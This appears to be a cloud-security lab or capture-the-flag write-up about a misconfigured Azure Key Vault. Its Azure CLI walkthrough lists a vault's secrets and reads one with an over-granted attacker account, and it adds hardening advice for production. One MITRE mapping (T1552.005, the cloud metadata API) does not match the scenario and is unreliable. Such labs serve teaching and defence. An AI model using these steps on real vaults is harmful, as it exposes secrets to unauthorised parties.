# Key Vault Misconfiguration

**Difficulty:** Intermediate | **Provider:** Azure | **Category:** Key Vault / Access Policy

## Scenario

An Azure Key Vault has been deployed with two misconfigurations that are common in
real-world environments:

1. **Access policy mode** (instead of the more secure Azure RBAC mode) — access policies
   are easier to misconfigure because they are applied directly on the vault and are not
   visible in the standard IAM view.
2. **Overly permissive access policy** — an attacker user was accidentally granted
   `Get` and `List` on secrets (e.g. mistaken for a service principal, or copied from
   another policy without review).

The attacker has `Reader` on the resource group, which lets them discover the vault name,
and the vault has public network access enabled — no private endpoint required.

## Attack Path

```
[Attacker] Reader on resource group
    |
    v
az keyvault list  -->  discover vault name
    |
    v
az keyvault secret list  -->  list secrets (Get/List policy applies)
    |
    v
az keyvault secret show --name flag  -->  flag
```

### Step 1 — Log in and find the vault

```bash
az login -u <attacker_username> -p <attacker_password>
az keyvault list --resource-group keyvault-misconfig --query "[].name" -o tsv
```

### Step 2 — List and read secrets

```bash
az keyvault secret list --vault-name <vault_name> --query "[].name" -o tsv
az keyvault secret show --vault-name <vault_name> --name flag --query value -o tsv
```

## How to Fix in Production

1. **Switch to Azure RBAC authorization** (`enable_rbac_authorization = true`).
   Roles are then managed in IAM — visible, auditable, and consistent with the rest of Azure.
2. **Audit access policies** before migrating: `az keyvault show --name <name> --query properties.accessPolicies`.
3. **Enable Key Vault firewall** and restrict access to known IP ranges or private endpoints.
4. **Enable soft-delete and purge protection** to prevent accidental or malicious deletion.
5. **Alert on secret access** using Microsoft Defender for Key Vault / Diagnostic Settings
   forwarded to a Log Analytics workspace.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Cloud Instance Metadata API | T1552.005 |
| Data from Cloud Storage | T1530 |
| Valid Accounts: Cloud Accounts | T1078.004 |
